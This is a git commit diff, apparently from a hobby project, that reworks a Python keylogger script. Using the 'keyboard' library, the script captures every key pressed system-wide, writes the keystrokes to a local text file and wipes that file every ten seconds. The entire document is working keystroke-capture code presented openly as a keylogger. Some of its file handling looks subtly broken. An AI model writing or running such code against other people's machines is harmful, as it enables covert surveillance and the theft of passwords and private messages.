d1a71b791f786318a196c99da236bf690aa64e13
Julian Williams <julian@wazworld.net>
2024-05-01 09:41:01 -0500

    it workie?

--- keylogger.py
+++ keylogger.py
@@ -3,41 +3,31 @@ import keyboard
 import asyncio
 import time
 
-log_file = 'keystrokes.txt'
-
-
+log_file = open('keystrokes.txt', 'w')
 
 
 def on_key_press(event):
-    with open(log_file, 'a') as f:
-        if event.name == 'enter':
-            f.write('\n')
-        elif event.name == 'space':
-            f.write(' ')
-        elif event.name == 'backspace':
-            size = f.tell()
-            f.truncate(size - 1)
-        elif event.name == '?' or event.name == '.' or event.name == '!':
-            f.write(event.name + '\n')
-        elif event.name == 'alttab' or event.name == 'tab':
-            pass
-        elif event.name == 'shift' or event.name == 'right shift':
-            pass
-        else:
-            f.write(event.name)
+    if event.name == 'enter':
+        log_file.write('\n')
+    elif event.name == 'space':
+        log_file.write(' ')
+    elif event.name == 'backspace':
+        size = log_file.tell()
+        log_file.truncate(size - 1)
+    elif event.name == '?' or event.name == '.' or event.name == '!':
+        log_file.write(event.name + '\n')
+    elif event.name == 'alttab' or event.name == 'tab':
+        pass
+    elif event.name == 'shift' or event.name == 'right shift':
+        pass
+    else:
+        log_file.write(event.name)
+    log_file.flush()
 
-
-def closeProgram():
-    sys.exit(0)
-
-async def clear(time, text):
-    await asyncio.sleep(time)
-    open(log_file, 'w').close()
-
+async def main():
+    while True:
+        await asyncio.sleep(10)
+        log_file.truncate(0)
 
 keyboard.on_press(on_key_press)
-keyboard.wait()
-
-
-
-
+asyncio.run(main())
